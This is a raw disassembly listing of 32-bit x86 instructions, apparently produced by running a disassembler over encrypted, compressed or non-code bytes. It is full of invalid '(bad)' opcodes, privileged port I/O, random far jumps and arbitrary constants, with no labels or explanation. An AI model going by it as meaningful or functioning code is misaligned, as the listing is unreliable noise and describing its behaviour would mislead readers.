  41f869:	pusha  
  41f86a:	imul   esp,DWORD PTR [ecx+0x51],0xbf0b63bd
  41f871:	outs   dx,BYTE PTR ds:[esi]
  41f872:	or     al,0x6a
  41f874:	aad    0xf2
  41f876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f877:	and    eax,0x5137a662
  41f87c:	sub    eax,0xabdbe848
  41f881:	outs   dx,BYTE PTR ds:[esi]
  41f882:	jg     0x41f85f
  41f884:	rcl    bh,cl
  41f886:	lods   al,BYTE PTR ds:[esi]
  41f887:	sbb    al,0xcb
  41f889:	jbe    0x41f8c2
  41f88b:	ss xor DWORD PTR ds:[esi-0x345f6e89],eax
  41f893:	jmp    0x8e39bee
  41f898:	sbb    al,BYTE PTR [ebx-0x1b6b791d]
  41f89e:	repz (bad) 
  41f8a2:	js     0x41f84b
  41f8a4:	(bad)  
  41f8a5:	jge    0x41f83f
  41f8a7:	stos   DWORD PTR es:[edi],eax
  41f8a8:	and    cl,BYTE PTR [edx*1-0x4c763730]
  41f8af:	ds aas 
  41f8b1:	jle    0x41f88c
  41f8b3:	jle    0x41f8db
  41f8b5:	into   
  41f8b6:	jmp    0x93d1:0xdd65c78a
  41f8bd:	aam    0x10
  41f8bf:	pop    es
  41f8c0:	fs fcom st(6)
  41f8c3:	out    0x98,al
  41f8c5:	xor    cl,dh
  41f8c7:	(bad)  
  41f8c8:	cmp    esp,eax
  41f8ca:	pop    ss
  41f8cb:	stc    
  41f8cc:	dec    esp
  41f8cd:	push   esp
  41f8ce:	jg     0x41f899
  41f8d0:	ins    DWORD PTR es:[edi],dx
  41f8d1:	sub    al,0xa9
  41f8d3:	xor    eax,0xd6dc765b
  41f8d8:	sbb    eax,0xce738945
  41f8dd:	or     BYTE PTR ds:0xa4011836,dh
  41f8e3:	in     eax,dx
  41f8e4:	xchg   DWORD PTR [eax+ecx*2-0x42acc94d],ecx
  41f8eb:	data16 xlat BYTE PTR ds:[ebx]
  41f8ee:	mov    al,0x53
  41f8f0:	xor    cl,al
  41f8f2:	cmp    eax,0xc5fc0225
  41f8f7:	or     BYTE PTR [eax],ah
  41f8f9:	pushf  
  41f8fa:	stos   DWORD PTR es:[edi],eax
  41f8fb:	adc    dl,BYTE PTR [edi]
  41f8fd:	fisubr DWORD PTR [eax]
  41f8ff:	test   eax,0x4b490582
  41f904:	inc    ecx
  41f905:	stos   BYTE PTR es:[edi],al
  41f906:	cli    
  41f907:	mov    cl,0x4b
  41f909:	pushf  
  41f90a:	or     eax,0x5e08b9b4
  41f90f:	xor    BYTE PTR gs:[ecx-0x39],bl
  41f913:	sub    al,0xc6
  41f915:	lea    edi,[ebp+ecx*8+0x2abf0027]
  41f91c:	pop    edi
  41f91d:	(bad)  
  41f91e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f91f:	lods   al,BYTE PTR ds:[esi]
  41f920:	rcr    ebp,cl
  41f922:	pushf  
  41f923:	and    DWORD PTR [ebx+0x5f],edx
  41f926:	sbb    BYTE PTR [ebx+0x4d],ah
  41f929:	out    0x1,al
  41f92b:	mov    dl,BYTE PTR [ecx+0x21]
  41f92e:	bound  ebx,QWORD PTR [ecx-0x4a]
  41f931:	je     0x41f8fc
  41f933:	xor    eax,0x325ca8a2
  41f938:	mov    BYTE PTR [esi],ah
  41f93a:	push   0x7b
  41f93c:	cmp    BYTE PTR [edx-0x4f],ch
  41f93f:	in     eax,0x7f
  41f941:	cld    
  41f942:	sub    BYTE PTR [edx-0x7a1bb3bb],dh
  41f948:	sub    ecx,DWORD PTR [edx-0x3ebe2f4e]
  41f94e:	mov    cl,0x6e
  41f950:	popa   
  41f951:	mul    BYTE PTR ds:0xe41a415e
  41f957:	aad    0xe
  41f959:	push   edi
  41f95a:	mov    esi,0xa1f6a309
  41f95f:	pop    es
  41f960:	std    
  41f961:	(bad)  
  41f962:	push   edi
  41f963:	(bad)  
  41f964:	cmp    eax,0x27b4c045
  41f969:	adc    BYTE PTR [esi],ch
  41f96b:	mov    bh,0x1a
  41f96d:	jle    0x41f901
  41f96f:	xor    ch,bl
  41f971:	add    bh,BYTE PTR [eax-0x64a4a86f]
  41f977:	and    eax,0xab68e7f7
  41f97c:	ins    DWORD PTR es:[edi],dx
  41f97d:	nop
  41f97e:	pushw  cs
  41f980:	sbb    bl,BYTE PTR cs:[edi-0x4e634e8f]
  41f987:	push   ebp
  41f988:	push   edx
  41f989:	je     0x41f9a4
  41f98b:	ror    ebp,cl
  41f98d:	xchg   dh,dh
  41f98f:	rcl    BYTE PTR [esi-0x42dacd7c],cl
  41f995:	out    dx,al
  41f996:	fisub  DWORD PTR [edi]
  41f998:	xor    al,0x57
  41f99a:	mov    ebp,0x513a044
  41f99f:	sti    
  41f9a0:	loope  0x41f9f1
  41f9a2:	es mov bh,dl
  41f9a5:	xor    esp,0x51
  41f9a8:	arpl   WORD PTR ds:0xf7ac11dc,si
  41f9ae:	add    esi,0xa050747d
  41f9b4:	push   eax
  41f9b5:	sub    bl,0x18
  41f9b8:	in     al,0xcd
  41f9ba:	js     0x41fa2b
  41f9bc:	into   
  41f9bd:	outs   dx,BYTE PTR ds:[esi]
  41f9be:	xchg   esi,eax
  41f9bf:	jg     0x41fa37
  41f9c1:	aam    0xcc
  41f9c3:	pop    eax
  41f9c4:	jmp    0xdc384d56
  41f9c9:	jns    0x41fa36
  41f9cb:	cld    
  41f9cc:	and    DWORD PTR [edi+0x2c],ebp
  41f9cf:	adc    ah,dh
  41f9d1:	pushf  
  41f9d2:	ficom  DWORD PTR [esi+0x67]
  41f9d5:	add    bl,BYTE PTR [esi-0x25]
  41f9d8:	inc    eax
  41f9d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9da:	jae    0x41fa07
  41f9dc:	ret    
  41f9dd:	mov    BYTE PTR [esi+0x29],ah
  41f9e0:	adc    eax,0x654c92d
  41f9e5:	cdq    
  41f9e6:	je     0x41f989
  41f9e8:	jp     0x41fa03
  41f9ea:	out    0xa4,eax
  41f9ec:	fsub   DWORD PTR [edi-0x25]
  41f9ef:	and    al,0x1a
  41f9f1:	push   ss
  41f9f2:	ins    DWORD PTR es:[edi],dx
  41f9f3:	and    eax,DWORD PTR [esi+0x44]
  41f9f6:	sub    dl,BYTE PTR [edx+0x2b]
  41f9f9:	and    ecx,DWORD PTR [edi+0x16b16077]
  41f9ff:	and    al,0x18
  41fa01:	mov    edx,0x9a5acd24
  41fa06:	xor    bl,BYTE PTR [esi-0x678a0661]
  41fa0c:	jmp    0x41f993
  41fa0e:	sub    al,0x8c
  41fa10:	rcl    DWORD PTR ds:0x23666583,cl
  41fa16:	sar    DWORD PTR [ecx],0xf6
  41fa19:	xor    edx,esp
  41fa1b:	(bad)  
  41fa1c:	fidivr WORD PTR [esi+0x69]
  41fa1f:	adc    ebx,DWORD PTR ds:0xee9b5b25
  41fa25:	call   0x3364:0x5201d2aa
  41fa2c:	xchg   esi,eax
  41fa2d:	jae    0x41fa11
  41fa2f:	lods   eax,DWORD PTR ds:[esi]
  41fa30:	xchg   ebx,eax
  41fa31:	pop    ds
  41fa32:	or     ecx,DWORD PTR [esp+ecx*4+0x1f058bfa]
  41fa39:	xor    BYTE PTR [eax],bl
  41fa3b:	xor    DWORD PTR [ecx+0xc],esi
  41fa3e:	stos   DWORD PTR es:[edi],eax
  41fa3f:	(bad)  
  41fa40:	pushf  
  41fa41:	dec    eax
  41fa42:	lock and BYTE PTR ds:0xe2c0c087,0xb3
  41fa4a:	mov    cl,0xb3
  41fa4c:	lock mov WORD PTR [ebx-0x7fa4eef0],ss
  41fa53:	shr    DWORD PTR [edx],cl
  41fa55:	jg     0x41fa6b
  41fa57:	mov    edx,0x7de4a4a0
  41fa5c:	xchg   ebx,eax
  41fa5d:	stc    
  41fa5e:	nop
  41fa5f:	jo     0x41fa3a
  41fa61:	es inc ecx
  41fa63:	fnstenv [ebx]
  41fa65:	or     al,0x69
  41fa67:	sub    ebp,DWORD PTR [ebp+0x72]
  41fa6a:	pop    ds
  41fa6b:	call   0x4619cda9
  41fa70:	adc    eax,edi
  41fa72:	sar    BYTE PTR [edi],0xe2
  41fa75:	popa   
  41fa76:	add    al,0x4f
  41fa78:	xchg   esp,eax
  41fa79:	mov    al,0x9f
  41fa7b:	xchg   edx,eax
  41fa7c:	mov    ds,WORD PTR [esi+0x69008de0]
  41fa82:	xor    DWORD PTR [esi],0xb2922ca9
  41fa88:	mov    esi,0xfbe1838f
  41fa8d:	mov    dl,0x84
  41fa8f:	sbb    BYTE PTR [eax-0x69fe7fee],dl
  41fa95:	mov    al,0xcb
  41fa97:	in     al,dx
  41fa98:	push   ss
  41fa99:	les    ecx,FWORD PTR [esp+eiz*8-0x75a57d32]
  41faa0:	shl    DWORD PTR [ecx-0x4853b31],1
  41faa6:	leave  
  41faa7:	ins    BYTE PTR es:[edi],dx
  41faa8:	adc    al,0x7b
  41faaa:	scas   al,BYTE PTR es:[edi]
  41faab:	jnp    0x41fa9e
  41faad:	jo     0x41faa2
  41faaf:	sbb    eax,0x334be74
  41fab4:	cmp    BYTE PTR [ecx+0x6a],dl
  41fab7:	repnz das 
  41fab9:	xor    ebp,DWORD PTR [ebx-0x52711348]
  41fabf:	jno    0x41fb40
  41fac1:	and    al,0xfe
  41fac3:	jmp    0xe67a:0x6dc5b461
  41faca:	jge    0x41faba
  41facc:	xchg   edx,eax
  41facd:	addr16 loope 0x41fa64
  41fad0:	int    0x8b
  41fad2:	push   ds
  41fad3:	ins    BYTE PTR es:[edi],dx
  41fad4:	ins    BYTE PTR es:[edi],dx
  41fad5:	cmp    DWORD PTR ds:0x436193f1,edx
  41fadb:	scas   eax,DWORD PTR es:[edi]
  41fadc:	loopne 0x41faa9
  41fade:	inc    esi
  41fadf:	xchg   esp,eax
  41fae0:	pop    eax
  41fae1:	pop    esi
  41fae2:	pop    esp
  41fae3:	aad    0xdd
  41fae5:	sbb    cl,dl
  41fae7:	pop    ebx
  41fae8:	add    BYTE PTR [eax],al
  41faea:	pop    eax
  41faeb:	dec    edx
  41faec:	dec    edx
  41faed:	push   edi
  41faee:	pop    edx
  41faef:	push   edi
  41faf0:	pop    ebp
  41faf1:	dec    edi
  41faf2:	mov    dh,0x0
  41faf4:	dec    edx
  41faf5:	push   ecx
  41faf6:	or     ax,0xffc6
  41fafa:	pop    esp
  41fafb:	mov    al,BYTE PTR [ecx]
  41fafd:	add    BYTE PTR [esi+0x67000006],al
  41fb03:	xchg   BYTE PTR [ebp+eax*8-0x50],dl
  41fb07:	fild   DWORD PTR [edi]
  41fb09:	and    al,0x52
  41fb0b:	xor    eax,0x1f84f633
  41fb10:	aas    
  41fb11:	stos   DWORD PTR es:[edi],eax
  41fb12:	add    esi,DWORD PTR [ecx]
  41fb14:	clc    
  41fb15:	dec    al
  41fb17:	xor    eax,0x2c5727a1
  41fb1c:	adc    dl,bl
  41fb1e:	xchg   eax,ebp
  41fb20:	das    
  41fb21:	mov    ebx,DWORD PTR [eax]
  41fb23:	push   0x46b28498
  41fb28:	(bad)  
  41fb29:	lahf   
  41fb2a:	adc    al,0xaf
  41fb2c:	ret    
  41fb2d:	test   BYTE PTR [ebx+0x59648dd1],dh
  41fb33:	xor    edi,edi
  41fb35:	xchg   ecx,eax
  41fb36:	jmp    0x41fae2
  41fb38:	int3   
  41fb39:	xchg   edi,eax
  41fb3a:	ror    DWORD PTR [eax+0x791ecab8],cl
  41fb40:	les    edx,FWORD PTR [eax-0x73]
  41fb43:	mov    BYTE PTR [eax+0xa],bh
  41fb46:	cmp    al,0x83
  41fb48:	sub    al,0x7a
  41fb4a:	ret    
  41fb4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb4c:	rol    ah,cl
  41fb4e:	rcr    DWORD PTR [esi+0x6c],0xf3
  41fb52:	repnz pop ecx
  41fb54:	xchg   BYTE PTR [edi+0x7ec81551],al
  41fb5a:	xor    eax,0x99d51fb9
  41fb5f:	pop    DWORD PTR [ecx-0x1a]
  41fb62:	fnstsw WORD PTR [eax-0x661766d8]
  41fb68:	int3   
  41fb69:	push   edi
  41fb6a:	lock out 0x68,eax
  41fb6d:	jno    0x41fb32
  41fb6f:	jge    0x41fb60
  41fb71:	push   cs
  41fb72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb73:	mov    esp,0x33dc3976
  41fb78:	das    
  41fb79:	mov    ?,WORD PTR [edx+0x61]
  41fb7c:	cmp    DWORD PTR [edi+eax*8],ebx
  41fb7f:	dec    ecx
  41fb80:	push   cs
  41fb81:	adc    DWORD PTR [esi-0x1c],esi
  41fb84:	sar    BYTE PTR [esi+0x32],cl
  41fb87:	into   
  41fb88:	pop    ebp
  41fb89:	and    al,BYTE PTR [edi-0x2c874636]
  41fb8f:	sbb    DWORD PTR [edx],esp
  41fb91:	jno    0x41fbb1
  41fb93:	fstp   TBYTE PTR ds:0xb5a13b23
  41fb99:	fild   DWORD PTR [ecx]
  41fb9b:	outs   dx,DWORD PTR ds:[esi]
  41fb9c:	dec    edi
  41fb9d:	fstp   QWORD PTR [eax+edi*2-0x6c]
  41fba1:	add    al,0x52
  41fba3:	inc    edx
  41fba4:	(bad)  
  41fba5:	fcomi  st,st(5)
  41fba7:	test   al,0x53
  41fba9:	pop    ebx
  41fbaa:	cmp    DWORD PTR [edi],ebx
  41fbac:	test   eax,0xaa3ac37f
  41fbb1:	sbb    DWORD PTR [ecx+0x9a1b47b],edx
  41fbb7:	pop    ss
  41fbb8:	cmp    DWORD PTR [edi+0x54a9a6f7],0x38
  41fbbf:	(bad)  
  41fbc0:	fidiv  DWORD PTR [edx+0x515eafb9]
  41fbc6:	pusha  
  41fbc7:	or     al,ah
  41fbc9:	in     al,0x2f
  41fbcb:	jnp    0x41fb8d
  41fbcd:	pop    ss
  41fbce:	xchg   edi,eax
  41fbcf:	int3   
  41fbd0:	pop    edi
  41fbd1:	inc    ebx
  41fbd2:	mov    eax,ds:0x1b83676e
  41fbd7:	adc    ebp,esp
  41fbd9:	int3   
  41fbda:	mov    ch,0xb3
  41fbdc:	mov    ecx,0xd2662e0e
  41fbe1:	xor    DWORD PTR [esi-0x79cbc9e1],eax
  41fbe7:	or     ch,BYTE PTR ds:0xb8cb5316
  41fbed:	shl    ebx,1
  41fbef:	mov    cl,0xe7
  41fbf1:	cs push eax
  41fbf3:	rol    DWORD PTR [ecx],0xca
  41fbf6:	cmc    
  41fbf7:	lea    ebx,[ebx]
  41fbf9:	and    eax,0x294f6f4d
  41fbfe:	popa   
  41fbff:	and    dl,BYTE PTR [ecx+0x6fc3f23c]
  41fc05:	mov    ebp,0xda759f09
  41fc0a:	jae    0x41fba4
  41fc0c:	cmc    
  41fc0d:	add    eax,0x6ff5edf2
  41fc12:	ins    DWORD PTR es:[edi],dx
  41fc13:	fxsave [esi]
  41fc16:	xchg   esi,eax
  41fc17:	in     eax,dx
  41fc18:	out    0xfb,eax
  41fc1a:	arpl   WORD PTR [edi],dx
  41fc1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc1d:	ret    
  41fc1e:	scas   al,BYTE PTR es:[edi]
  41fc1f:	xchg   DWORD PTR [eax+ecx*8-0x1a70b247],edi
  41fc26:	xor    ebx,edx
  41fc28:	imul   edi,DWORD PTR [eax+edx*8+0x36],0xd9f8c986
  41fc30:	test   al,0x6c
  41fc32:	int3   
  41fc33:	std    
  41fc34:	sub    ecx,DWORD PTR [esi]
  41fc36:	pop    ebx
  41fc37:	fimul  WORD PTR [ecx+0x49]
  41fc3a:	aad    0xe5
  41fc3c:	add    ah,dh
  41fc3e:	cs adc ah,ch
  41fc41:	or     edx,DWORD PTR [eax+0xd6c2842]
  41fc47:	mov    al,BYTE PTR [edi+0x78]
  41fc4a:	outs   dx,BYTE PTR ds:[esi]
  41fc4b:	fcmovne st,st(1)
  41fc4d:	xor    dl,0x25
  41fc50:	jbe    0x41fc86
  41fc52:	adc    BYTE PTR [edi],ch
  41fc54:	inc    esi
  41fc55:	shr    DWORD PTR [edi-0xc],0x81
  41fc59:	in     al,0x85
  41fc5b:	and    BYTE PTR [edi+0x45c368da],ah
  41fc61:	and    bl,bh
  41fc63:	nop
  41fc64:	call   DWORD PTR [edi+eiz*1]
  41fc67:	and    al,0x3e
  41fc69:	mul    BYTE PTR cs:[edi]
  41fc6c:	pop    eax
  41fc6d:	mov    ebx,0x5ac1b3a0
  41fc72:	xor    eax,0x5387c84
  41fc77:	test   DWORD PTR [ebx+0x3db15978],eax
  41fc7d:	adc    esp,DWORD PTR [ebx-0x4ca4ff5b]
  41fc83:	lods   eax,DWORD PTR ds:[esi]
  41fc84:	push   esp
  41fc85:	pop    esi
  41fc86:	mov    bl,0x50
  41fc88:	aas    
  41fc89:	ins    BYTE PTR es:[edi],dx
  41fc8a:	jae    0x41fc1a
  41fc8c:	add    ebp,ecx
  41fc8e:	fnsave [edx]
  41fc90:	nop
  41fc91:	and    edi,edi
  41fc93:	dec    esp
  41fc94:	push   edi
  41fc95:	sub    eax,0x2de59512
  41fc9a:	dec    esi
  41fc9b:	into   
  41fc9c:	aas    
  41fc9d:	pop    esi
  41fc9e:	cld    
  41fc9f:	retf   0x497
  41fca2:	test   eax,0x79ede0aa
  41fca7:	add    BYTE PTR [eax+0x1702a2f4],ch
  41fcad:	inc    esp
  41fcae:	add    BYTE PTR [esi-0x3266f62],0x14
  41fcb5:	cld    
  41fcb6:	mov    ebx,0x9812c06a
  41fcbb:	and    BYTE PTR [edi+0x7e390d3f],ch
  41fcc1:	and    bh,BYTE PTR [ebp+0x52]
  41fcc4:	jb     0x41fc5d
  41fcc6:	fld    DWORD PTR [bp+di-0x4040]
  41fccb:	ds pop edi
  41fccd:	jb     0x41fcda
  41fccf:	sti    
  41fcd0:	mov    ds:0x9ae0d260,eax
  41fcd5:	arpl   bp,si
  41fcd7:	call   0xe1fdf3f7
  41fcdc:	jecxz  0x41fd0f
  41fcde:	dec    edx
  41fcdf:	sub    al,0x87
  41fce1:	cmp    eax,DWORD PTR [edx-0x21]
  41fce4:	in     eax,0x3b
  41fce6:	clc    
  41fce7:	and    BYTE PTR [eiz*8+0x44e9fa82],ah
  41fcee:	lds    edx,FWORD PTR [ecx-0x7a]
  41fcf1:	or     dh,BYTE PTR [eax]
  41fcf3:	out    dx,al
  41fcf4:	popf   
  41fcf5:	(bad)  
  41fcf6:	mov    dh,0xdc
  41fcf8:	mov    ah,0xdf
  41fcfa:	ins    BYTE PTR es:[edi],dx
  41fcfb:	add    al,0xde
  41fcfd:	pop    ss
  41fcfe:	push   eax
  41fcff:	mov    al,ds:0x9fcfad60
  41fd04:	hlt    
  41fd05:	and    eax,0x3b9f4fe8
  41fd0a:	ja     0x41fd67
  41fd0c:	jae    0x41fd12
  41fd0e:	mov    ebx,0x242d789a
  41fd13:	or     eax,0xfb8a584d
  41fd18:	inc    esp
  41fd19:	push   esi
  41fd1a:	xchg   edx,eax
  41fd1b:	sub    al,0x20
  41fd1d:	ins    DWORD PTR es:[edi],dx
  41fd1e:	push   edx
  41fd1f:	dec    esi
  41fd20:	add    eax,0xe0660f14
  41fd25:	fcomip st,st(5)
  41fd27:	mov    es,WORD PTR [eax-0x61c4f183]
  41fd2d:	das    
  41fd2e:	lods   eax,DWORD PTR ds:[esi]
  41fd2f:	stc    
  41fd30:	aaa    
  41fd31:	ror    bl,cl
  41fd33:	pushf  
  41fd34:	scas   al,BYTE PTR es:[edi]
  41fd35:	and    al,0xd6
  41fd37:	push   esi
  41fd38:	inc    esp
  41fd39:	fisttp WORD PTR cs:[ebp+ebx*1-0x7e]
  41fd3e:	pop    ebp
  41fd3f:	or     DWORD PTR [edx+0xc02dccb],ebx
  41fd45:	mov    ah,0xd0
  41fd47:	test   eax,0x9cf668db
  41fd4c:	aas    
  41fd4d:	sub    eax,0x54a8026
  41fd52:	imul   ebp,eax,0xfffffff7
  41fd55:	inc    eax
  41fd56:	hlt    
  41fd57:	adc    al,0x12
  41fd59:	adc    DWORD PTR [ecx],ebp
  41fd5b:	daa    
  41fd5c:	not    ebp
  41fd5e:	push   ss
  41fd5f:	scas   al,BYTE PTR es:[edi]
  41fd60:	sbb    al,0xa3
  41fd62:	sbb    BYTE PTR [ecx+0x1ef54a61],ch
  41fd68:	inc    esi
  41fd69:	and    DWORD PTR [edi+0x4e],edi
  41fd6c:	std    
  41fd6d:	inc    esp
  41fd6e:	ss addr16 aas 
  41fd71:	jle    0x41fda7
  41fd73:	push   ecx
  41fd74:	cmp    eax,0x68a823f2
  41fd79:	rcl    DWORD PTR [ebx],1
  41fd7b:	jbe    0x41fd3f
  41fd7d:	fisub  WORD PTR [eax]
  41fd7f:	ret    0x3cc8
  41fd82:	mov    dh,0xdc
  41fd84:	mov    cl,0x7c
  41fd86:	loopne 0x41fde1
  41fd88:	and    ch,dl
  41fd8a:	jbe    0x41fd26
  41fd8c:	je     0x41fd7e
  41fd8e:	and    BYTE PTR [edi-0x52],bl
  41fd91:	mov    eax,ds:0xba5e7df6
  41fd96:	mov    ebx,0xa7b29a41
  41fd9b:	add    eax,DWORD PTR [eax-0x55]
  41fd9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd9f:	test   eax,0xbd1c12ed
  41fda4:	xchg   ebp,eax
  41fda5:	mov    ah,0xf9
  41fda7:	push   es
  41fda8:	xchg   ecx,eax
  41fda9:	sub    eax,0x5bcf59cf
  41fdae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdaf:	shl    dl,cl
  41fdb1:	retf   0x5c5d
  41fdb4:	test   DWORD PTR [esi+0x11],edx
  41fdb7:	or     DWORD PTR [edx+0x5fe2982f],ebp
  41fdbd:	fdiv   QWORD PTR [edi+edx*1+0x20954256]
  41fdc4:	lods   al,BYTE PTR ds:[esi]
  41fdc5:	dec    edi
  41fdc6:	or     ch,BYTE PTR [edi+edx*8+0x275beeb1]
  41fdcd:	into   
  41fdce:	add    BYTE PTR [ecx-0x156db189],bl
  41fdd4:	jnp    0x41fd7e
  41fdd6:	xchg   esp,eax
  41fdd7:	or     BYTE PTR ds:0xe992fa24,0xce
  41fdde:	jle    0x41fdf0
  41fde0:	es in  al,dx
  41fde2:	shl    BYTE PTR [ecx+0x6a9518ff],1
  41fde8:	ror    DWORD PTR [eax+ecx*8+0x7650c234],0xf7
  41fdf0:	jnp    0x41fdcf
  41fdf2:	and    BYTE PTR [edx+0x399ee031],0x1
  41fdf9:	sub    esi,0x6205c007
  41fdff:	inc    ebx
  41fe00:	push   ebx
  41fe01:	cmp    al,dh
  41fe03:	lods   al,BYTE PTR ds:[esi]
  41fe04:	mov    bx,dx
  41fe07:	fimul  WORD PTR [edi-0x42]
  41fe0a:	jle    0x41fe1f
  41fe0c:	repnz push esi
  41fe0e:	mov    cl,BYTE PTR [edx-0x10c7a343]
  41fe14:	dec    ebx
  41fe15:	(bad)  
  41fe16:	xchg   esi,eax
  41fe17:	int3   
  41fe18:	dec    esp
  41fe19:	sub    eax,edx
  41fe1b:	inc    edx
  41fe1c:	dec    esi
  41fe1d:	inc    ecx
  41fe1e:	int    0xbd
  41fe20:	adc    ecx,edx
  41fe22:	outs   dx,DWORD PTR ds:[esi]
  41fe23:	stc    
  41fe24:	fnstenv [ebp+0x378078e3]
  41fe2a:	sub    al,0x42
  41fe2c:	mov    eax,0x8f3d71ab
  41fe31:	fist   WORD PTR [ecx-0x47]
  41fe34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe36:	jmp    0xa92143c4
  41fe3b:	or     al,0x2
  41fe3d:	pop    ebx
  41fe3e:	inc    ecx
  41fe3f:	push   edx
  41fe40:	push   0xffffffd9
  41fe42:	(bad)  [edx-0x76c1fc6f]
  41fe48:	aaa    
  41fe49:	sbb    edx,DWORD PTR [edi+ebx*4]
  41fe4c:	pop    ebp
  41fe4d:	mov    edi,0x9c3ff5cb
  41fe52:	stos   DWORD PTR es:[edi],eax
  41fe53:	ins    BYTE PTR es:[edi],dx
  41fe54:	dec    esp
  41fe55:	mov    ch,0x6
  41fe57:	mov    al,dh
  41fe59:	repnz das 
  41fe5b:	mov    al,0x1d
  41fe5d:	dec    esp
  41fe5e:	data16 ja 0x41fdf6
  41fe61:	mov    esp,0x16073547
  41fe66:	in     eax,0x15
  41fe68:	mov    cl,0x4f
  41fe6a:	sub    BYTE PTR [ebp+0x2ef5544f],ch
  41fe70:	arpl   WORD PTR [esi],bx
  41fe72:	rcr    BYTE PTR [edx-0x4b],cl
  41fe75:	popf   
  41fe76:	add    ebp,ebp
  41fe78:	inc    ebx
  41fe79:	(bad)
  41fe7c:	(bad)  
  41fe7d:	mov    WORD PTR [ecx],?
  41fe7f:	add    ah,BYTE PTR [esi]
  41fe81:	stc    
  41fe82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe83:	call   0x1e59fb6e
  41fe88:	sub    DWORD PTR [eax],edx
  41fe8a:	mov    DWORD PTR [ebx],ebx
  41fe8c:	pop    edx
  41fe8d:	and    esp,edx
  41fe8f:	(bad)  
  41fe90:	ficomp DWORD PTR [esi+0x14]
  41fe94:	pop    ecx
  41fe95:	mov    dl,dl
  41fe97:	xor    DWORD PTR [ebp-0x4327fa49],esi
  41fe9d:	sbb    edi,DWORD PTR [eax-0x7220d982]
  41fea3:	add    dh,BYTE PTR [eax-0x5b8a6044]
  41fea9:	aaa    
  41feaa:	es repnz scas eax,DWORD PTR es:[edi]
  41fead:	or     ecx,DWORD PTR [edx]
  41feaf:	cmp    edi,DWORD PTR [ebp-0x731bb59e]
  41feb5:	shr    BYTE PTR [ebp-0xbb8592b],1
  41febb:	inc    esi
  41febc:	sbb    DWORD PTR [edx+0x24a9013a],edi
  41fec2:	sbb    eax,0xa5e6a286
  41fec7:	add    ebx,DWORD PTR [edx+eiz*8]
  41feca:	shl    BYTE PTR [ebx-0x56],cl
  41fecd:	pushf  
  41fece:	push   ebx
  41fecf:	add    al,0x58
  41fed1:	lds    edi,FWORD PTR [ecx-0x336532a2]
  41fed7:	push   0x48
  41fed9:	mov    ebp,0x3849f77f
  41fede:	and    eax,0xffffffe4
  41fee1:	sub    DWORD PTR [esp+ecx*4+0x7348caa4],edi
  41fee8:	sub    BYTE PTR [esi*1-0xc6afe4d],al
  41feef:	rcl    BYTE PTR [eax],0xa6
  41fef2:	pop    ecx
  41fef3:	into   
  41fef4:	ja     0x41feca
  41fef6:	mov    ds:0x970e4ae8,eax
  41fefb:	lock sti 
  41fefd:	pop    edi
  41fefe:	test   DWORD PTR [edx+0x3861f6ad],ebx
  41ff04:	in     al,0xb9
  41ff06:	mov    edi,0xe6c84f0f
  41ff0b:	arpl   WORD PTR ds:0x20fe8245,di
  41ff11:	push   ebp
  41ff12:	cs mov bl,0xed
  41ff15:	imul   ebp,DWORD PTR [edx+0x4cf03021],0xffffffe6
  41ff1c:	out    0xdc,eax
  41ff1e:	dec    edx
  41ff1f:	les    ebp,FWORD PTR [edi]
  41ff21:	or     eax,0xfa66751c
  41ff26:	mov    bh,0x30
  41ff28:	nop
  41ff29:	popf   
  41ff2a:	call   0xa4cc:0xb8b49f29
  41ff31:	mov    ds:0xe6e3e2cb,eax
  41ff36:	pop    esp
  41ff37:	out    dx,eax
  41ff38:	add    DWORD PTR [eax+0x69],ecx
  41ff3b:	ror    bl,1
  41ff3d:	add    esp,ebx
  41ff3f:	and    DWORD PTR [edi+ebx*8],esp
  41ff42:	dec    esi
  41ff43:	je     0x41ff07
  41ff45:	mov    WORD PTR [esi+0x67],ss
  41ff48:	adc    BYTE PTR [edi+0x3cef30],ah
  41ff4e:	aad    0xf0
  41ff50:	or     esp,DWORD PTR [ebp-0x6d]
  41ff53:	adc    BYTE PTR [edi+0x27c4ba2b],dh
  41ff59:	push   0x51c6ab12
  41ff5e:	jno    0x41ff71
  41ff60:	cmp    al,0x95
  41ff62:	stos   BYTE PTR es:[edi],al
  41ff63:	and    esi,DWORD PTR [edi]
  41ff65:	test   eax,0x21bd6917
  41ff6a:	dec    esp
  41ff6b:	cmp    al,0x1
  41ff6d:	hlt    
  41ff6e:	dec    ecx
  41ff6f:	jo     0x41ff70
  41ff71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff72:	jg     0x41ffe7
  41ff74:	sbb    al,0x86
  41ff76:	loop   0x41ff52
  41ff78:	jp     0x41ff0c
  41ff7a:	shl    dh,0x2b
  41ff7d:	das    
  41ff7e:	mov    bh,0x89
  41ff80:	clc    
  41ff81:	es (bad) 
  41ff85:	scas   al,BYTE PTR es:[edi]
  41ff86:	ins    DWORD PTR es:[edi],dx
  41ff87:	shr    dh,1
  41ff89:	or     BYTE PTR [esp+0x212d6c12],cl
  41ff90:	das    
  41ff91:	fs pusha 
  41ff93:	push   ebp
  41ff94:	push   edi
  41ff95:	in     eax,dx
  41ff96:	pop    ecx
  41ff97:	pop    es
  41ff98:	or     al,BYTE PTR [eax]
  41ff9a:	pop    eax
  41ff9b:	or     DWORD PTR [ebx],ebx
  41ff9d:	inc    esp
  41ff9e:	popa   
  41ff9f:	test   edi,ebx
  41ffa1:	popa   
  41ffa2:	cmp    DWORD PTR [edi+0x40bc5eb],esi
  41ffa8:	mov    ds:0xfad07b3a,eax
  41ffad:	sbb    BYTE PTR [ecx],dh
  41ffaf:	add    BYTE PTR [ebx+0x57],dl
  41ffb2:	je     0x41fff2
  41ffb4:	xor    DWORD PTR [ebx+0x2e6c3665],esi
  41ffba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffbb:	pop    esp
  41ffbc:	(bad)  
  41ffbd:	int    0x84
